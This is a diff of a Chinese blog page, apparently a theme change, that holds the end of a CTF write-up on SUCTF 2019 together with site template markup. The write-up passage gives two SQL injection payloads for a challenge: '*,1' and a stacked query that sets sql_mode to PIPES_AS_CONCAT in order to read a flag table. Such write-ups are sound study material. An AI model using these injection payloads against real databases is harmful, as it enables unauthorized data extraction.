-<p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225003738.png" alt="在这里插入图片描述"><br><strong>预期解</strong></p>
+<p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225003738.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><strong>预期解</strong></p>
 <p>由于作者没有过滤全，出现了非预期解，而预期解是：通过堆叠注入，设置<code>sql_mode</code>的值为<code>PIPES_AS_CONCAT</code>，从而将<code>||</code>视为字符串的连接操作符而非或运算符。</p>
 <p>所以payload为：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
 <p>这样输出的flag会与1进行拼接，得到：</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225816413.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225816413.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="upload-labs2">upload labs2</span></h1>
+            <hr>
+          </div>
+          <br>
+          <div>
+            
+              <p>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
+                  &nbsp;
+                
+              </p>
+            
+            <p>
+              <i class="iconfont icon-tag"></i>
+              
+                <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
+              
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      <div class="disqus" style="width:100%">
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_shortname = 'Lethe';
+    var disqus_config = function () {
+      this.page.url = 'https://lethe.site/2019/08/26/SUCTF-2019-部分复现/';
+      this.page.identifier = '/2019/08/26/SUCTF-2019-部分复现/';
+    };
+    (function () {
+      var d = document, s = d.createElement('script');
+      s.type = 'text/javascript';
+      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+      powered by Disqus.</a></noscript>
+</div>
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
-<div class="lx-navigation">
-	<div class="lx-cover prev lx-cover-sm" style="background-image: url(/images/footer_1.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/09/01/第五空间Writeup-Web/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Next</span>
-						<h3>第五空间Writeup_Web</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-        <div class="lx-cover next lx-cover-sm" style="background-image: url(/images/footer_2.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/08/15/XML实体注入攻击/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Prev</span>
-						<h3>XML实体注入攻击</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-</div>
-</div>
-<div class="comment"><div id="comments"></div></div>
-<footer>
-  <div>
-  Copyright &copy; 2019.<a href="/">Lethe | 忘川</a>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+    
   </div>
 </footer>
-</div>
 
-<button class="menu-trigger"></button>
-<div class="menu">
-  <div class="menu-head">
-    <span class="layer">
-      <div class="col">
-        <div class="row for-pic">
-          <div class="profile-pic">
-            <a href="/"><img src="/images/2.jpg" alt="Lethe"></a>
-          </div>
-        </div>
-        <div class="row for-name">
-          <p>Lethe</p>
-          <span class="tagline">Hello, World!</span>
-        </div>
-      </div>
-    </span>
-  </div>
-  <nav class="menu-container">
-  <ul class="menu-items">
-    <li><a href="/"><i class="fa fa-home fa-fw"></i>首页</a></li>
-    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-bookmark fa-fw"></i>页面</span>
-        <ul>
-          <li><a href="/about">关于</a></li>
-        </ul>
-    </li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-link fa-fw"></i>友链</span>
-        <ul>
-          <li> <a href="https://hiworldalice.github.io/" target="_blank">Tunt</a></li>
-        <li> <a href="https://3nd.xyz" target="_blank">3ND</a></li>
-        </ul>
-    </li>
-  </ul>
-  </nav>
-</div>
-
-<div class="gototop js-top">
-  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
-</div>
-<script src="/js/jquery.easing.min.js"></script>
-<script src="/js/jquery.waypoints.min.js"></script>
-<script src="/js/jquery.stellar.min.js"></script>
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/popper/popper.min.js"></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js"></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
+  <script src="/js/lazyload.js"></script>
 
+
+  
+    <script src="/lib/tocbot/tocbot.min.js"></script>
+  
+  <script src="/js/post.js"></script>
+
+
+  <script src="/lib/prettify/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+  <script src="/lib/typed/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "SUCTF_2019_部分复现&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+  <script src="/lib/anchor/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script>
+    if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || (/Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent))) {
+      $("#background").css("background-attachment", "scroll");
+    }
+  </script>
 
 </body>
 </html>
